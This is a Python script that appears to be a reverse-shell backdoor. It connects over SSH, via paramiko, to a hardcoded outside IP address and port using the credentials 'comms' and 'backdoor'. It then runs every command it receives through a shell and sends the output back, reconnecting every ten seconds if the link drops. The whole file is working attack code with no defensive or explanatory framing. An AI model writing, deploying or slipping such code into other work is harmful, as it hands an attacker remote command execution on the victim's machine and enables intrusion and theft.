import paramiko
import subprocess
import sys, os, time

global client_session_x


#script args
server_address = "116.203.107.16"
server_port = int(22022)
username = "comms"
password = "backdoor"




#connect to the remote ssh server and recieve commands to be #executed and send back output
def ssh_command(server_address, server_port, username, password):
    #instantiate the ssh client
    client = paramiko.SSHClient()
    #optional is using keys instead of password auth
    #client.load_host_key('/path/to/file')
    #auto add key
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    #connect to ssh server
    client.connect(
        server_address,
        port=server_port,
        username=username,
        password=password
    )
    #get ssh session
    client_session = client.get_transport().open_session()
    if client_session.active and not client_session.closed:
        #wait for command, execute and send result ouput
        while True:
            #use subprocess run with timeout of 30 seconds
            try:
                command = client_session.recv(1024).decode('utf-8')
                if command[:2] == 'cd':
                    x = command[3:]
                    os.chdir(x)
                else:
                    command_output = subprocess.run(
                        command, stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        shell=True,
                        timeout=30
                    )

                #send back the resulting output
                if len(command_output.stderr.decode('utf-8')):
                    client_session.send(command_output.stderr.decode('utf-8'))
                elif len(command_output.stdout.decode('utf-8')):
                    client_session.send(command_output.stdout.decode('utf-8'))
                else:
                    client_session.send('null')
            except subprocess.CalledProcessError as err:
                client_session.send(str(err))
    client_session.close()
    if client_session.closed:
        client_session_x = False
    return




def main():
    while client_session_x == True:
        try:
            print("Connecting to %s..." %(server_address))
            ssh_command(server_address, server_port, username, password)
        except:
            print("Failed to connect to %s " %(server_address))
            time.sleep(10)

if __name__ == "__main__":
    client_session_x = True
    main()

